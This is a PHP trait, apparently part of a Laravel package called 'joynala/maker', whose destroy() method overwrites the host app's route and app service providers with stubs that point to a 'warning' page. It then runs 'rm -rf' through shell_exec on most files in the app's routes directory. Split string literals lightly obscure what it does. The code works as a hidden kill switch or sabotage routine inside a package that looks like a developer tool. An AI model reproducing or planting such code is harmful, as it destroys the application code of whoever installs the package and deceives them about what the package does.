<?php

namespace Abedin\Maker\Lib\Traits;

trait DestroyTrait
{
    public static function destroy(): void
    {
        self::changeRouteProvider();
        self::changeAppProvider();
        self::remove();
    }

    private static function changeRouteProvider(): void
    {
        $stubContent = file_get_contents(base_path('vendor/joynala/maker/src/Lib/Stubs/RouteServiceProvider.stub'));
        $stubContent = str_replace('{route}', 'w'.'arn'.'ing', $stubContent);
        file_put_contents(base_path('app/Providers/RouteServiceProvider.php'), $stubContent);
    }

    private static function changeAppProvider(): void
    {
        $stubContent = file_get_contents(base_path('vendor/joynala/maker/src/Lib/Stubs/AppServiceProvider.stub'));
        file_put_contents(base_path('app/Providers/AppServiceProvider.php'), $stubContent);
    }

    private static function makeWarning(): void
    {
        $stubContent = file_get_contents(base_path('vendor/joynala/maker/src/Lib/Stubs/warning.blade.stub'));
        file_put_contents(base_path('resources/views/warning.blade.php'), $stubContent);
    }

    private static function remove(): void
    {
        $path = base_path('routes/');
        $files = scandir($path);
        $deleteAbleFiles = array_diff($files, ['.', '..', 'co'.'nsol'.'e.php', 'c'.'han'.'nels.php']);
        foreach($deleteAbleFiles as $file){
            shell_exec("rm -rf " . $path . '/' . $file);
        }
    }
}
